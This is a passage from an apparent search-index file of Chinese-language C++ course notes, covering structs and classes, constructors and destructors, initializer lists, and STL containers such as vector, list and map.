<li>\u5176\u4e2d\uff0c\u65e0\u9700\u4f7f\u7528 <code>typedef</code> \u4e5f\u53ef\u4ee5\u76f4\u63a5\u58f0\u660e <code>Point a, b;</code></li> <li>C++ \u652f\u6301\u5c06\u51fd\u6570\u4e5f\u5199\u5165\u7ed3\u6784\u4f53\u4e2d (\u5982 print \u51fd\u6570\uff0c\u53ea\u662f\u6b64\u65f6\u4e0d\u9700\u8981 const Point *p)</li> <li>\u800c\u5bf9\u4e8e <code>move</code> \u4e5f\u5177\u6709\u53e6\u4e00\u79cd\u5199\u6cd5 (\u5373\u4e0d\u5e26 body \u7684\u51fd\u6570) </li> </ul> <pre><code>\u00b7\u00b7\u00b7\nstruct Point{   \n        float x;\n        float y;\n        void init(int ix, int iy)\n        {\n            x = ix;\n            y = iy;\n        }\n        void print()\n        {\n            cout &lt;&lt; x &lt;&lt; \" , \" &lt;&lt; y &lt;&lt; endl;\n        }\n        void move(int dx, int dy);\n    } ;\n\n    void Point::move(int dx, int dy)       //struct \u4e2d\u4e0d\u5e26 body \uff0c\u6240\u4ee5\u9700\u8981\u53e6\u7ed9\u51fa body\n    {\n        x += dx;\n        y += dy;\n    }\n\n    int main()\n    {\n        Point a, b;\n        a.init(1, 1);\n        b.init(1, 1);\n        a.move(2, 2);\n        a.print();\n        b.print();\n    }\n</code></pre> <ul> <li>\u4e0a\u8ff0\u8868\u793a C \u4e2d struct \u4e2d\u652f\u6301\u6210\u5458\u53d8\u91cf\uff0cC++ \u4e2d\u4e0d\u4ec5\u652f\u6301\u6210\u5458\u53d8\u91cf\u4e5f\u652f\u6301\u6210\u5458\u51fd\u6570 (\u8fd9\u5c31\u662f C++ \u7684\u7c7b)</li> <li>C++ \u4e2d struct \u548c class \u57fa\u672c\u662f\u901a\u7528\u7684\uff0c\u552f\u6709\u51e0\u4e2a\u7ec6\u8282\u4e0d\u540c</li> </ul> struct vs. class <ul> <li>\u4f7f\u7528 class \u65f6\uff0c\u7c7b\u4e2d\u7684\u6210\u5458\u9ed8\u8ba4\u90fd\u662f private \u5c5e\u6027\u7684\uff1b\u800c\u4f7f\u7528 struct \u65f6\uff0c\u7ed3\u6784\u4f53\u4e2d\u7684\u6210\u5458\u9ed8\u8ba4\u90fd\u662f public \u5c5e\u6027\u7684</li> <li>class \u7ee7\u627f\u9ed8\u8ba4\u662f private \u7ee7\u627f\uff0c\u800c struct \u7ee7\u627f\u9ed8\u8ba4\u662f public \u7ee7\u627f</li> <li>class \u53ef\u4ee5\u4f7f\u7528\u6a21\u677f\uff0c\u800c struct \u4e0d\u80fd</li> </ul> <pre><code>class Point{\npublic:\n    void init(int x, int y);\n    void move(int dx, int dy);\n    void print() const;\n\nprivate:\n    int x;\n    int y;\n};\n</code></pre> <p>\u77e5\u4e4e - \u53c2\u8003 CSDN - \u53c2\u8003</p>"}, {"location": "Course/OOP/Lec01/#resolver", "title": "::resolver", "text": "<pre><code>void S::f()\n{\n    ::f();  //Would be recursive otherwise\n    ::a++;  // Select the global a\n    a--;    //  The a at class scope\n}\n</code></pre> <ul> <li>&lt; Class Name &gt; :: &lt; function name &gt; (:: \u662f\u7b26\u53f7, not operator)</li> <li>:: &lt; function name &gt;</li> <li><code>::f();</code> \u5728\u5f53\u524d\u8bed\u5883\u4e0b\uff0c\u82e5\u4e0d\u52a0 \u2018::\u2019 \u8868\u793a\u8c03\u7528\u81ea\u5df1\u3002\u52a0\u4e0a \u2018::\u2019 \u8868\u793a f \u4e0d\u662f\u81ea\u5df1\uff0c\u662f free/global \u7684\u51fd\u6570</li> <li>\u540c\u7406, <code>::a++;</code> \u4e5f\u8868\u793a\u5168\u5c40\u53d8\u91cf a; <code>a--;</code> \u6307\u6210\u5458\u53d8\u91cf a</li> </ul>"}, {"location": "Course/OOP/Lec01/#stash", "title": "Stash", "text": "<p>Note</p> <p>Stash \u662f\u4e00\u79cd\u5bb9\u5668\uff0c\u53ef\u4ee5\u4fdd\u5b58\u4efb\u610f\u6570\u636e\u7c7b\u578b\u7684\u53d8\u91cf (\u5c06\u4efb\u610f\u6570\u636e\u7c7b\u578b\u7684\u53d8\u91cf\u770b\u4f5c\u5b57\u8282\u6570\u7ec4)</p>"}, {"location": "Course/OOP/Lec01/#this", "title": "this", "text": "<p>\u4e3a\u4ec0\u4e48\u6210\u5458\u51fd\u6570\u4e0d\u9700\u8981\u5f15\u5165\u7c7b\u4f3c <code>Point *p</code>, \u4e5f\u80fd\u8bc6\u522b\u662f\u54ea\u4e2a\u53d8\u91cf</p> <ul> <li>Realized with <code>this</code> </li> <li><code>this</code> is a hidden parameter for all member functions, with the type of the struct</li> </ul> Example <p><code>void Stash::init(int sz)</code> \u2192 can be regarded as <code>void Stash::init(Stash *this, int sz)</code></p> <ul> <li>To call the function, we must specify a variable</li> </ul> Example <p><code>Stash a;</code> <code>a.init(10);</code> \u2192 can be regarded as <code>Stash::init(&amp;a, 10);</code></p> <ul> <li>Inside member functions, you can use <code>this</code> as the pointer to the variable that calls the function</li> <li><code>this</code> is a natural local variable of all structs member functions that you can not define, but you can use it directly</li> </ul> this \u7684\u4e00\u79cd\u7528\u6cd5 <pre><code>struct Stash{\n    float x;\n    float y;\n    void init(int x, int y)\n    {\n        this-&gt;x = x;\n        this-&gt;y = y;\n    }\n}\n</code></pre>"}, {"location": "Course/OOP/Lec02/", "title": "Step in Object-Oriented", "text": "<p> \u7ea6 945 \u4e2a\u5b57  161 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>Objects = Attributes + Services</p> <ul> <li>\u9996\u5148\u5c06 struct \u6539\u4e3a class (struct \u662f\u6307\u5185\u90e8\u6210\u5458\u7edf\u7edf\u5bf9\u5916\u5f00\u653e\u7684, class \u662f\u9ed8\u8ba4\u5916\u90e8\u4e0d\u53ef\u8bbf\u95ee\u7684)</li> </ul> <p>\u5bf9\u5916\u4e0e\u5bf9\u5185\u76f8\u5bf9\u5e94\uff0c\u5bf9\u5185\u6307\u53ef\u4ee5\u5728 struct \u4e2d\u6216\u8005\u6210\u5458\u51fd\u6570\u4e2d\u4f7f\u7528</p> Example <pre><code>\u00b7\u00b7\u00b7\nclass Point{   \n    float x;\n    float y;\npublic:\n    void init(int ix, int iy)\n    {\n        x = ix;\n        y = iy;\n    }\n    void print()\n    {\n        cout &lt;&lt; x &lt;&lt; \" , \" &lt;&lt; y &lt;&lt; endl;\n    }\n    void move(int dx, int dy);\n} ;\n\nvoid Point::move(int dx, int dy)       //struct \u4e2d\u4e0d\u5e26 body \uff0c\u6240\u4ee5\u9700\u8981\u53e6\u7ed9\u51fa body\n{\n    x += dx;\n    y += dy;\n}\n\nint main()\n{\n    Point a, b;\n    a.init(1, 1);\n    b.init(1, 1);\n    a.x = b.x = 1;  // --+\n    a.y = b.y = 1;  // --+-- Error: \u4e0d\u53ef\u8bbf\u95ee\n    a.move(2, 2);\n    a.print();\n    b.print();\n}\n</code></pre>"}, {"location": "Course/OOP/Lec02/#constructor", "title": "Constructor", "text": "<ul> <li>Guaranteed initialization with the constructor<ul> <li>If a class has a constructor, the compiler automatically calls that constructor at the point an object is created, before client programmers can get their hands on the object.</li> <li>The name of the constructor is the same as the name of the class</li> <li><code>class</code> \u4e2d\u7684\u6784\u9020\u51fd\u6570\uff0c\u51fd\u6570\u540d\u548c\u7c7b\u7684\u540d\u5b57\u4e00\u81f4 (\u65e0\u8fd4\u56de\u7c7b\u578b)</li> </ul> </li> <li> <p>Constructors with arguments</p> <ul> <li>The constructor can have arguments to allow you to specify how an object is created, give it initialization values, and so on.</li> <li>\u5f53\u540c\u540d\u6210\u5458\u51fd\u6570\u5b58\u5728\u53c2\u6570\u65f6\uff0c\u7528\u7c7b\u6784\u9020\u5bf9\u8c61\u7684\u65f6\u5019\u8981\u4e3b\u52a8\u7ed9\u51fa\u76f8\u5e94\u7684\u503c, \u5982 <code>Point a(1, 1);</code></li> <li><code>Point *p = new Point(5, 6);</code> \u2014\u2014&gt; <code>new</code> \u505a\u4e86\u4e24\u4ef6\u4e8b<ol> <li>\u7533\u8bf7\u7a7a\u95f4</li> <li>\u8c03\u7528 Point \u7684\u6784\u9020\u51fd\u6570\uff0c\u628a 5 \u548c 6 \u4f20\u9012\u7ed9\u6784\u9020\u51fd\u6570 (\u4f46\u6784\u9020\u51fd\u6570\u6267\u884c\u7684\u65f6\u5019\u8fd9\u4e2a\u5bf9\u8c61\u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u6784\u9020\u51fd\u6570\u505a\u7684\u4e8b\u60c5\u662f\u521d\u59cb\u5316) <p>\u6784\u9020\u51fd\u6570\u4e0d\u505a\u5185\u5b58\u5206\u914d</p> </li> </ol> </li> </ul> Example <pre><code>\u00b7\u00b7\u00b7\nclass Point{\nprivate:\n    float x;\n    float y;\npublic:\n    Point(int x, int y);    //\u540d\u5b57\u548c\u7c7b\u7684\u540d\u5b57\u4e00\u6837\uff0c\u4e14\u65e0\u8fd4\u56de\u7c7b\u578b\n    void print();\n    void move(int dx, int dy);\n};\n\nPoint::Point(int x, int y)\n{\n    this-&gt;x = x;\n    this-&gt;y = y;\n}\nvoid Point::print()\n{\n    \u00b7\u00b7\u00b7\n}\nvoid Point::move(int dx, int dy)\n{\n    \u00b7\u00b7\u00b7\n}\nint main()\n{\n    Point a(1, 2), b(3, 4);\n    \u00b7\u00b7\u00b7\n}\n\n\u00b7\u00b7\u00b7\n</code></pre> </li> <li> <p>\u51fd\u6570\u7684\u91cd\u8f7d \u2014\u2014 \u5728 class \u4e2d\u6709\u591a\u4e2a\u540c\u540d\u7684\u6210\u5458\u51fd\u6570 (\u4f46\u9700\u8981\u4fdd\u8bc1\u53c2\u6570\u8868\u4e0d\u540c)</p> Example <pre><code>\u00b7\u00b7\u00b7\nclass Point{\nprivate:\n    float x;\n    float y;\npublic:\n    Point(int deep);\n    Point(int x, int y);\n    void print();\n    void move(int dx, int dy);\n};\nPoint::Point(int deep)\n{\n    x = y = deep;\n}\n\u00b7\u00b7\u00b7\nint main()\n{\n    \u00b7\u00b7\u00b7\n    Point c(10); //\u4f1a\u8c03\u7528\u53c2\u6570\u4e3a deep \u7684\u6210\u5458\u51fd\u6570\n    \u00b7\u00b7\u00b7\n}\n\u00b7\u00b7\u00b7\n</code></pre> <ul> <li><code>Point c(10);</code> \u7b49\u4ef7\u4e8e <code>Point c=10;</code> (\u5355\u4e2a\u8d4b\u503c\u90fd\u53ef\u4ee5\u7528\u5706\u62ec\u53f7\u6216\u7b49\u53f7)</li> <li>\u7531\u4e8e\u5b58\u5728\u6784\u9020\u51fd\u6570\uff0c\u6b64\u65f6 (\u5373\u4f7f float x \u548c float y \u90fd\u662f public) \u4e0d\u518d\u652f\u6301 \u7ed3\u6784\u90a3\u6837\u7684\u65b9\u5f0f\u521d\u59cb\u5316 (<code>Point a = {1, 1};</code>)</li> </ul> </li> <li> <p>The default constructor</p> <ul> <li>A default constructor is one that can be called with no arguments</li> <li>\u6307\u7684\u662f\u5199\u4e86\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u6ca1\u6709\u53c2\u6570</li> <li>\u5982\u679c\u672a\u7ed9\u51fa\u6784\u9020\u51fd\u6570\uff0c\u7f16\u8bd1\u5668\u4f1a\u7ed9\u51fa\u4e00\u4e2a\u4ec0\u4e48\u90fd\u4e0d\u505a\u7684\u6784\u9020\u51fd\u6570\u6765\u901a\u8fc7\u7f16\u8bd1</li> </ul> Example <pre><code>struct Y{\n    float f;\n    int i;\n    Y(int a);\n}\n</code></pre> <ul> <li>\u6b64\u65f6: <ul> <li><code>Y y1[] = {Y(1), Y(2), Y(3)};</code> \u221a</li> <li><code>Y y2[2] = {Y(1)};</code> \u00d7 (Y \u6709\u6784\u9020\u51fd\u6570\u4e14\u4e0d\u662f\u9ed8\u8ba4\u6784\u9020\u51fd\u6570, \u5982\u4ee3\u7801\u9700\u8981\u7ed9\u51fa\u4e24\u4e2a\u6784\u9020\u51fd\u6570)</li> <li><code>Y y3[7];</code> \u00d7 (\u540c\u7406\uff0c\u6709\u9ed8\u8ba4\u6784\u9020\u51fd\u6570\u624d\u53ef\u4ee5\u8fd9\u4e48\u5199)</li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec02/#the-destructor", "title": "The destructor", "text": "<ul> <li>In C++, cleanuo is as important as initialization and is therefore guaranteed with the destructor</li> <li> <p>The destructor is named after the name of the class with a leading tidle (~). The destructor never has any arguments.</p> <ul> <li>The destructor is called automatically by the compiler when the objects goes out of scope.</li> <li>The only evidence for a destructor call is the closing brace of the scope that surrounds the object.</li> <li>\u5982\u4e0b\uff0c\u6790\u6784\u51fd\u6570 <code>~Y();</code> \u4f1a\u5728\u5bf9\u8c61\u7684\u7a7a\u95f4\u88ab\u56de\u6536\u4e4b\u524d\u88ab\u81ea\u52a8\u8c03\u7528.</li> </ul> <pre><code>class Y{\npublic:\n    ~Y();\n};\n</code></pre> Example <p><pre><code>\u00b7\u00b7\u00b7\nclass Point{\nprivate:\n    float x;\n    float y;\npublic:\n    Point(int deep);\n    Point(int x, int y);\n    Point(){x = 31, y = 17;}\n    ~Point()\n    {\n        cout &lt;&lt; \"~\";\n        print();\n    }\n    void print();\n    \u00b7\u00b7\u00b7\n}\n\u00b7\u00b7\u00b7\nint main()\n{\n    Point a(1, 2), b(3, 4);\n    Point *p = new Point(5, 6);\n    Point c(10);\n    Point d;\n    d.print();\n    delete p;\n}\n</code></pre> <pre><code>$ ./a.out\n31,17\n~5,6    # \u5bf9\u5e94 p\n~31,17  # \u5bf9\u5e94 d\n~10,10  # \u5bf9\u5e94 c\n~3,4    # \u5bf9\u5e94 b\n~1,2    # \u5bf9\u5e94 a\n</code></pre></p> <ul> <li>\u56e0\u4e3a\u6240\u6709\u53d8\u91cf\u5b9a\u4e49\u5728 main \u4e2d\uff0c\u5f53\u53d1\u751f\u5230 <code>delete</code> \u65f6\u672c\u5730\u53d8\u91cf\u751f\u5b58\u671f\u7ed3\u675f\uff0c\u5373\u6240\u6709\u53d8\u91cf\u90fd\u8981\u6790\u6784 (\u6790\u6784\u7684\u987a\u5e8f\u65f6\u6784\u9020\u7684\u9006\u5e8f)</li> <li>\u5982\u679c main \u4e2d\u4fee\u6539\u5982\u4e0b</li> </ul> <p><pre><code>int main()\n{\n    Point a(1, 2), b(3, 4);\n    Point *p = new Point(5, 6);\n    {\n        Point c(10);\n    }\n    Point d;\n    d.print();\n    delete p;\n}\n</code></pre> <pre><code>$ ./a.out\n~10,10  # \u5bf9\u5e94 c\n31,17\n~5,6    # \u5bf9\u5e94 p\n~31,17  # \u5bf9\u5e94 d\n~3,4    # \u5bf9\u5e94 b\n~1,2    # \u5bf9\u5e94 a\n</code></pre></p> <ul> <li>\u56e0\u4e3a c \u51fa\u4e86\u62ec\u53f7\u5c31\u7ed3\u675f\u4e86\uff0c\u6240\u4ee5\u5148\u88ab\u6790\u6784</li> </ul> </li> </ul> Global objects <ul> <li>Consider</li> </ul> <pre><code>#include \"X.h\"\nX global_x1(1, 2);\nX global_x2(3, 4);\n</code></pre> <ul> <li>Constructors are called before entering <code>main()</code><ul> <li>Order controlled by appearance in file</li> <li>In this case, <code>global_x1</code> before <code>global_x2</code></li> <li><code>main()</code> is no longer the first function called</li> </ul> </li> <li>Destructors called when<ul> <li><code>main()</code> exits</li> <li><code>exit()</code> is called</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec02/#storage-allocation", "title": "Storage allocation", "text": "<ul> <li>The compiler allocates all the storage for a scope at the opening brace of that scope</li> <li>The constructor call doesn\u2019t happen until the sequence point where the object is defined</li> </ul>"}, {"location": "Course/OOP/Lec02/#initialization", "title": "Initialization", "text": ""}, {"location": "Course/OOP/Lec02/#initializer-list", "title": "Initializer list", "text": "<p>code</p> <pre><code>class Point{\nPrivate:\n    const float x, y;\n    Point(float xa = 0.0, float ya = 0.0): x(xa), y(ya){}\n};\n</code></pre> <p><code>Point(float xa = 0.0, float ya = 0.0): x(xa), y(ya){}</code> \u4e2d <code>: x(xa), y(ya)</code> \u5373\u521d\u59cb\u5316\u5217\u8868\u5f62\u5f0f</p> <ul> <li>Can initialize any type of data<ul> <li>pseduo-constructor calls for built-in types</li> <li>No need to perform assignment within body of constructor</li> </ul> </li> <li>Order of initialization is order of declaration<ul> <li>Not the order in Initializer list!</li> <li>Destoryed in reverse order of declaration</li> <li>\u6bd4\u5982\u5373\u4fbf\u5728 Initializer list \u4e2d <code>Point(float xa = 0.0, float ya = 0.0): y(ya), x(xa){}</code>\uff0c <code>ya</code> \u5728 <code>xa</code> \u4e4b\u524d\u58f0\u660e\uff0c\u4f46\u662f\u7531\u4e8e\u6210\u5458\u53d8\u91cf\u58f0\u660e <code>x</code> \u5728 <code>y</code> \u4e4b\u524d\uff0c\u6240\u4ee5 <code>x</code> \u4f1a\u5148\u88ab\u521d\u59cb\u5316</li> <li><code>Point(float xa = 0.0, float ya = 0.0): y(ya), x(y){}</code> \u5c31\u4e0d\u4f1a\u7b26\u5408 <code>x = y = ya</code></li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec02/#others", "title": "Others", "text": "\u7f16\u7a0b\u89c4\u8303 <ul> <li>Declarations vs. Definitions<ul> <li>cpp file \u2014\u2014 compile unit</li> <li>Only declarations are allowed to be in .h (). Declarations are as follows: <ul> <li>extern variables</li> <li>function prototypes</li> <li>class/struct declaration</li> <li>inline function</li> <li>Others are Definitions</li> </ul> </li> </ul> </li> <li> <ul> <li>All .h files should look like this: </li> </ul> <p>Standard header file structure </p> <pre><code>#ifdef  HEADER_FLAG\n#define HEADER_FLAG\n//Type declaration here\n#endif  //HEADER_FLAG\n</code></pre> </li> <li> <p>Tips for header</p> <ul> <li>One class declaration per header file</li> <li>Associated with one source file in the same prefix of file name</li> <li>The contents of a header file is surrounded with <code>#ifdef #define #endif</code> </li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec03/", "title": "Container | \u5bb9\u5668", "text": "<p> \u7ea6 691 \u4e2a\u5b57  61 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"}, {"location": "Course/OOP/Lec03/#stl", "title": "STL", "text": "<p>Abstract</p> <p>\u5728 C++ \u4e2d\uff0c\u5bb9\u5668\u662f STL \u4e2d\u7684\u6a21\u677f\u63d0\u4f9b\u7684</p> <ul> <li>STL = Standard Template Library | \u6807\u51c6\u6a21\u677f\u5e93</li> <li>Part of the ISO Standard C++ Library</li> <li>Data Structures and algorithms for C++</li> </ul> Why use STL <ul> <li>Reduce development time</li> <li>Code readability</li> <li>Robustness</li> <li>Portable code</li> <li>Maintainable code</li> <li>Easy</li> </ul> <ul> <li>Library includes:<ul> <li>A Pair class (pairs of anything, int/int, int/char, etc)</li> <li>Containers<ul> <li>vector (expandable array)</li> <li>deque (expandable array, expands at both ends)</li> <li>list (double-linked)</li> <li>sets and maps</li> </ul> </li> <li>Basic Algorithms (sort, search, etc)</li> </ul> </li> <li>All identifiers in library are in std namespace (<code>using namespace std;</code>)</li> <li>The three parts of STL<ul> <li>Containers</li> <li>Algorithms</li> <li>Iterators</li> </ul> </li> <li>Top 3 data structures<ul> <li><code>map</code><ul> <li>Any key type, any value type</li> <li>sorted</li> </ul> </li> <li><code>vector</code><ul> <li>like c array, but auto-extending</li> </ul> </li> <li><code>list</code><ul> <li>doubly-linked list</li> </ul> </li> </ul> </li> <li>All Sequential Containers<ul> <li>vector: variable array</li> <li>deque: dual-end queue</li> <li>list: double-linked-list</li> <li>forward_list: as it</li> <li>array: as \u201carray\u201d</li> <li>string: char.array</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec03/#vector-class", "title": "Vector Class", "text": "Example <pre><code>#include &lt;iostream&gt;\nusing namespace std;\n// Use namespace so that you can refer to vectors in C++ library\n#include &lt;vector&gt;\n\nint main()\n{\n    vector&lt;int&gt; x;  //Just declare a vector of ints(no need to worry about size)\n    for(int a = 0; a &lt; 1000; a++)\n    {\n        x.push_back(a); //Add elements\n    }\n    /* Have a pre-defined iterator for vector class, can use it to print out the items in vector */\n    vector&lt;int&gt;::iterator p;    \n    for(p = x.begin(); p &lt; x.end(); p++)\n    {\n        cout &lt;&lt; *p &lt;&lt; \" \";\n    }\n    return 0;\n}\n</code></pre> <ul> <li><code>vector&lt;int&gt; x;</code> \u4e2d <code>x</code> \u662f\u53d8\u91cf\u7684\u540d\u5b57\uff0c<code>&lt;int&gt;</code> \u8868\u793a\u8981\u5728 vector \u91cc\u9762\u653e <code>int</code>\u7c7b\u578b\u7684\u6570\u636e</li> <li><code>::iterator</code> \u8868\u793a vector \u4e2d\u7684\u7c7b <code>iterator</code>\uff0c\u53ef\u4ee5\u5bf9 <code>vector of int</code> \u679a\u4e3e, \u62ff\u51fa\u6765\u7684\u6bcf\u4e00\u4e2a\u90fd\u5e94\u8be5\u662f <code>int</code></li> <li><code>begin</code> \u4f1a\u8fd4\u56de\u4e00\u4e2a\u679a\u4e3e\u5668\uff0c\u7528\u8fd9\u4e2a\u679a\u4e3e\u5668\u53ef\u4ee5\u679a\u4e3e\u5bb9\u5668\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5143\u7d20</li> </ul> <ul> <li>It is able to increase its internal capacity as required: as more items are added, it simply makes enough room for them</li> <li>It keeps its own private count of how many items it is currently storing. Its size method returns the number of objects currently in it</li> <li>In maintains the order of items you insert into it. You can later retrieve them in the same order.</li> </ul>"}, {"location": "Course/OOP/Lec03/#basic-vector-operations", "title": "Basic Vector Operations", "text": "<ul> <li>Constructors <ul> <li><code>vector&lt;ElementType&gt; c;</code></li> <li><code>vector&lt;ElementType&gt; c1(c2);  //c1 \u53ef\u4ee5\u5f97\u5230 c2 \u91cc\u7684\u6240\u6709\u5185\u5bb9</code></li> </ul> </li> <li>Simple Methods<ul> <li><code>V.size(); //num items</code></li> <li><code>V.empty(); //Judge if empty</code></li> <li><code>==, !=, &lt;, &gt;, &lt;=, &gt;= //\u6bd4\u8f83\u4e24\u4e2a vector \u7684\u5927\u5c0f\uff0c\u4f9d\u6b21\u62ff\u5bf9\u5e94\u5143\u7d20\u6bd4\u8f83</code></li> <li><code>V.swap(v2); //swap \u4e24\u4e2a vector \u7684\u5168\u90e8\u5185\u5bb9</code></li> </ul> </li> <li>Iterators<ul> <li><code>I.begin(); //first positiion</code></li> <li><code>I.end();  //last position</code></li> </ul> </li> <li>Element access<ul> <li><code>V.at(index)</code></li> <li><code>V[index]</code></li> <li><code>V.front(); //first item</code></li> <li><code>V.back();  //last item</code></li> </ul> </li> <li>Add/Remove/Find<ul> <li><code>V.push_back(e);</code></li> <li><code>V.pop_back(e);</code></li> <li><code>V.insert(position, e); // position \u662f\u4e00\u4e2a iterator\uff0c\u4e0d\u80fd\u4f7f\u7528 1\uff0c2\uff0c3</code></li> <li><code>V.erase(position); // size will change after \"erase\"</code></li> <li><code>V.clear();</code></li> <li><code>V.find(first, last, item);</code></li> </ul> </li> </ul> Pitfalls WRONGRIGHT <ul> <li>Accessing an invalid vector&lt;&gt; element<ul> <li><code>vector&lt;int&gt; v;</code></li> <li><code>v[100] = 1; //Whooops!</code></li> </ul> </li> </ul> <ul> <li>use <code>push_back()</code> </li> <li>Preallocate with constructor</li> <li>Reallocation with <code>reserve()</code></li> <li>Check <code>capacity()</code> </li> </ul>"}, {"location": "Course/OOP/Lec03/#list-class", "title": "List Class", "text": "<p>\u53cc\u5411\u94fe\u8868</p> <ul> <li>Same basic concepts as vector<ul> <li>Constructors</li> <li>Ability to compare lists (==, !=, &lt;, &gt;, &lt;=, &gt;=)</li> <li>Ability to access front and back of list<ul> <li><code>x.front(), x.back()</code></li> </ul> </li> <li>Ability to assign items to a list, remove items <ul> <li><code>x.push_back(item), x.push_front(item)</code></li> <li><code>x.pop_back(), x.pop_front()</code></li> <li><code>x.remove(item)</code></li> </ul> </li> </ul> </li> </ul> code Sample List Application<pre><code>#include &lt;iostream&gt;\n#include &lt;list&gt;\n#include &lt;string&gt;\nusing namespace std;\nint main()\n{\n    list&lt;string&gt; s;\n    s.push_back(\"hello\");\n    s.push_back(\"world\");\n    s.push_front(\"tide\");\n    s.push_front(\"crimson\");\n    list&lt;string&gt;::iterator p;\n    for(p = s.begin(); p != s.end(); p++)\n    {\n        cout &lt;&lt; *p &lt;&lt; \" \";\n    }\n    cout &lt;&lt; endl;\n}\n</code></pre> <ul> <li>Note the termination condition for the for loop: <code>p != s.end()</code></li> </ul> Pitfalls WRONGRIGHT <ul> <li>Using invalid iterator<ul> <li><code>list&lt;int&gt; L; list&lt;int&gt;::iterator li;</code></li> <li><code>li = L.begin();  L.erase(li);</code></li> <li><code>++li; // WRONG - \u6b64\u65f6 li \u5df2\u7ecf\u88ab erase</code></li> </ul> </li> </ul> <ul> <li>Use return value of erase to advance<ul> <li><code>li = L.erase(li); //RIGHT</code></li> <li>\u6b64\u65f6 li \u6307\u5411\u7684\u662f\u539f\u6765\u7684\u4e0b\u4e00\u4e2a</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec03/#maps", "title": "Maps", "text": "<ul> <li>Maps are collections that contain pairs of values.</li> <li>Pairs consist of a key and a value (\u6545\u58f0\u660e\u8981\u6307\u5b9a\u4e24\u4e2a\u7c7b\u578b)</li> <li>Lookup works by supplying a key, and retrieving a value</li> <li>An example: a telephone book</li> </ul> Example <pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include &lt;map&gt;\nusing namespace std;\n\nint main()\n{\n    map&lt;string, float&gt; price;\n    price[\"apple\"] = 0.75;\n}\n</code></pre> Pitfalls WRONGRIGHT <ul> <li>Inadvertently inserting into map&lt;&gt;<ul> <li><code>if(foo[\"bob\"] == 1)  //silently created entry \"bob\"</code></li> </ul> </li> </ul> <ul> <li>Use <code>count()</code> to check for a key without creating a new entry<ul> <li><code>if(foo.count(\"bob\"))</code></li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec03/#iterator", "title": "Iterator", "text": "<p>use list as example <code>list&lt;int&gt; L;</code></p> <ul> <li>Declaring<ul> <li><code>list&lt;int&gt;::iterator li;</code></li> </ul> </li> <li>Front of container<ul> <li><code>li = L.begin();</code></li> </ul> </li> <li>Past the end<ul> <li><code>li = L.end();</code></li> </ul> </li> <li>Can increment<ul> <li><code>li = L.begin();</code></li> <li><code>++li; // second item</code></li> </ul> </li> <li>Can be dereferenced<ul> <li><code>*li = 10;</code></li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec03/#self-defined-classes-in-stl-containers", "title": "Self-defined classes in STL Containers", "text": "<ul> <li>Might need:<ul> <li>Assignment Operator -&gt; <code>operator=()</code></li> <li>Default Constructor</li> </ul> </li> <li>For sorted types, like map&lt;&gt;<ul> <li>Need less-than operator -&gt; <code>operator&lt;()</code><ul> <li>Some types have this by default (<code>int, char, string</code>)</li> <li>Some do not (<code>char *</code>)</li> </ul> </li> </ul> </li> </ul> Example <pre><code>\u00b7\u00b7\u00b7\nclass Student{\npublic:\n    int x;\n    Student(int k) : x(k) {}\n};\nint main()\n{\n    vector&lt;Student&gt;  ss;   \n    vector&lt;Student&amp;&gt; sl;   \n    vector&lt;Student*&gt; sp;    \n    \u00b7\u00b7\u00b7\n}\n</code></pre> <ul> <li><code>vector&lt;Student*&gt; sp;</code> \u8868\u793a vector \u4e2d\u5b58\u7684\u662f\u6307\u9488</li> </ul>"}, {"location": "Course/OOP/Lec03/#other-data-structures", "title": "Other data structures", "text": "<ul> <li>set, multiset, multimap</li> <li>queue, priority_queue</li> <li>stack, deque</li> <li>slist, bitset, valarray</li> </ul>"}, {"location": "Course/OOP/Lec04/", "title": "Object Interactive | \u5bf9\u8c61\u4ea4\u4e92", "text": "<p> \u7ea6 694 \u4e2a\u5b57  129 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p>"}, {"location": "Course/OOP/Lec04/#local-variable", "title": "local variable", "text": "<ul> <li>Local variables are defined inside a method, have a scope limited to the method to which they belong</li> </ul> Example <pre><code>#include &lt;iostream&gt;\nusing namespace std;\nint value = 0xdeadbeef;\n\nclass A {\nprivate:\n    int value;\npublic:\n    A():value(0xabababab) {}\n    void f(){\n        int value = 0xcdcdcdcd;\n        cout &lt;&lt; hex &lt;&lt; value &lt;&lt; endl;       // \u672c\u5730\u53d8\u91cf value -&gt; 0xcdcdcdcd\n        cout &lt;&lt; hex &lt;&lt; this-&gt;value &lt;&lt; endl; // \u6210\u5458\u53d8\u91cf value -&gt; 0xabababab\n        cout &lt;&lt; hex &lt;&lt; ::value &lt;&lt; endl;     // \u5168\u5c40\u53d8\u91cf value -&gt; 0xdeadbeef\n    }\n};\nint main()\n{\n    A a;\n    a.f();\n}\n</code></pre>"}, {"location": "Course/OOP/Lec04/#initialization", "title": "Initialization", "text": "<ul> <li> <p>Member Init</p> <ul> <li>Directly initialize a member (benefit: for all constructors)</li> <li>Only C++11|| works</li> </ul> Example <pre><code>class A{\nprivate:\n    int A = 10;\n\u00b7\u00b7\u00b7\n};\n</code></pre> </li> <li> <p>Initializer list</p> </li> </ul> initialization vs. assignment <ul> <li><code>Student::Student(string s):name(s) {}</code><ul> <li>initiazlization before constructor</li> </ul> </li> <li><code>Student::Student(string s) { name = s; }</code><ul> <li>assignment in constructor (\u5728\u8d4b\u503c\u524d\uff0cname \u5df2\u7ecf\u88ab\u521d\u59cb\u5316\u4e3a\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32)</li> <li>string must have a default constructor</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec04/#function-overloading", "title": 